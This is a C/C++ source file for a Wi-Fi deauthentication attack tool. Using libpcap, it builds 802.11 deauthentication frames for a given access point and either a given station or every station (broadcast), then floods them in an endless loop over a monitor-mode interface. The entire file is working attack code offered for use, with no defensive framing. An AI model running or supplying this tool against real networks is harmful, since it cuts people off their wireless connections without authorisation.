#include <stdio.h>
#include <cstdio>
#include <pcap.h>
#include <arpa/inet.h>
#include <iostream>
#include "header.h"

void attackdeauth(char *dev, uint8_t *ap, uint8_t *st)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        exit(-1);
    }

    struct DeauthPacket packet;

    packet.radio.vison = 0x00;
    packet.radio.pad =0x00;
    packet.radio.len=htons(0x0c00);
    packet.radio.flag=htonl(0x04800000);
    packet.radio.rate=htonl(0x02001800);

    packet.deauth.field=htons(0xc000);
    packet.deauth.dur=htons(0x3a01);

    memcpy(packet.deauth.rec,st,6);
    memcpy(packet.deauth.des,ap,6);
    memcpy(packet.deauth.bss,ap,6);


    packet.deauth.num=htons(0x2000);

    packet.wire.code=htons(0x0700);

    printf("start send!!");

    while (true) {

        int res = pcap_sendpacket(handle,reinterpret_cast<const u_char *>(&packet),sizeof (DeauthPacket) );
        if (res != 0){
            fprintf(stderr, "sendpacket return %d error=%s\n",res,pcap_geterr(handle));
            }
        pcap_sendpacket(handle,reinterpret_cast<const u_char *>(&packet),sizeof (DeauthPacket) );
        pcap_sendpacket(handle,reinterpret_cast<const u_char *>(&packet),sizeof (DeauthPacket) );
        pcap_sendpacket(handle,reinterpret_cast<const u_char *>(&packet),sizeof (DeauthPacket) );
        pcap_sendpacket(handle,reinterpret_cast<const u_char *>(&packet),sizeof (DeauthPacket) );

        //sleep(1);
        }
    pcap_close(handle);

}


/*
uint8_t setmac(char *mac){
    uint8_t newmac[6];
    memset(newmac, 0x00, sizeof(newmac));
    sscanf(mac, "%02x:%02x:%02x:%02x:%02x:%02x",&newmac[0], &newmac[1], &newmac[2], &newmac[3], &newmac[4], &newmac[5]);

    return *newmac;


}
*/

void usage() {
    printf("syntax : deauth attack <interface> <ap mac> [<station mac>]\n");
    printf("sample : deauth attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int main(int argc, char* argv[]) {


    printf("welcome deauthattack!!\n\n");

    //uint8_t apmac = setmac(argv[2]);
    //uint8_t stmac = setmac(argv[3]);
    //uint8_t allmac = setmac("ff:ff:ff:ff:ff:ff");


    if (argc==3){
        uint8_t apmac[6];
        memset(apmac, 0x00, sizeof(apmac));
        sscanf(argv[2], "%02x:%02x:%02x:%02x:%02x:%02x",&apmac[0], &apmac[1], &apmac[2], &apmac[3], &apmac[4], &apmac[5]);


        uint8_t allmac[6];
        memset(allmac, 0x00, sizeof(allmac));
        sscanf("ff:ff:ff:ff:ff:ff", "%02x:%02x:%02x:%02x:%02x:%02x",&allmac[0], &allmac[1], &allmac[2], &allmac[3], &allmac[4], &allmac[5]);


        attackdeauth(argv[1],apmac,allmac);

    }
    else if (argc ==4){

        uint8_t apmac[6];
        memset(apmac, 0x00, sizeof(apmac));
        sscanf(argv[2], "%02x:%02x:%02x:%02x:%02x:%02x",&apmac[0], &apmac[1], &apmac[2], &apmac[3], &apmac[4], &apmac[5]);

        uint8_t stmac[6];
        memset(stmac, 0x00, sizeof(stmac));
        sscanf(argv[3], "%02x:%02x:%02x:%02x:%02x:%02x",&stmac[0], &stmac[1], &stmac[2], &stmac[3], &stmac[4], &stmac[5]);

        attackdeauth(argv[1],apmac,stmac);

    }
    else{
        usage();
        return -1;
    }


}

